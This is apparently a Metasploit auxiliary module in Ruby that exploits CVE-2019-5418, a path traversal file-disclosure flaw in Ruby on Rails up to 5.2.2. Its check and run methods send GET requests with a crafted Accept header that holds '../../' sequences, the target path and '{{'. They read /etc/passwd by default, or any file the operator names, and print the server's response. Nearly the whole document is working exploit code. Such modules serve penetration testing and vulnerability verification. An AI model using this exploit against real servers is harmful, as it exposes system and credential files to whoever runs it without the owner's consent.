##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'        => 'Ruby On Rails File Content Disclosure (\'doubletap\')',
        'Description' => %q{
          This module uses a path traversal vulnerablity in Ruby on Rails
          versions =< 5.2.2 to read files on a target server.
        },
        'Author'      =>
        [
          'Carter Brainerd <0xCB@protonmail.com>', # Metasploit module
          'John Hawthorn <john@hawthorn.email>' # PoC/discovery
        ],
        'License'     => MSF_LICENSE,
        'References'     => [
          [ 'URL', 'https://hackerone.com/reports/473888' ],
          [ 'URL', 'https://github.com/mpgn/Rails-doubletap-RCE' ],
          [ 'URL', 'https://groups.google.com/forum/#!topic/rubyonrails-security/pFRKI96Sm8Q' ],
          [ 'CVE', '2019-5418']
        ]
      )
    )

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('ROUTE', [true, 'A route on the vulnerable server.', '/msf']),
        OptString.new('TARGET_FILE', [true, 'The absolute path of remote file to read.', '/etc/passwd'])
      ]
    )
  end

  def check
    # Check if target file is absolute path
    unless datastore['TARGET_FILE'][0] == '/'
      print_error "TARGET_FILE must be an absolute path (eg. /etc/passwd)."
      return false
    end

    # Fire off the request
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(datastore['ROUTE']),
      'headers' => { 'Accept' => "../../../../../../../../../../etc/passwd{{"} # What is this, the 90s?
    })

    if res.nil?
      print_error "Request timed out."
      return false
    end

    if res.body.include? 'root:x:0:0:root:'
      print_good 'Target is vulnerable!'
      return true
    else
      print_error 'Target is not vulnerable.'
      return false
    end
  end

  def run
    unless check
      print_error "Check did not pass, exiting."
      return
    end

    print_status "Requesting file #{datastore['TARGET_FILE']}"

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(datastore['ROUTE']),
      'headers' => { 'Accept' => "../../../../../../../../../..#{datastore['TARGET_FILE']}{{"}
    })

    if res.nil?
      print_error "Request timed out."
      return
    end

    print_status "Response from server:"
    print_line res.body.to_s
  end

end
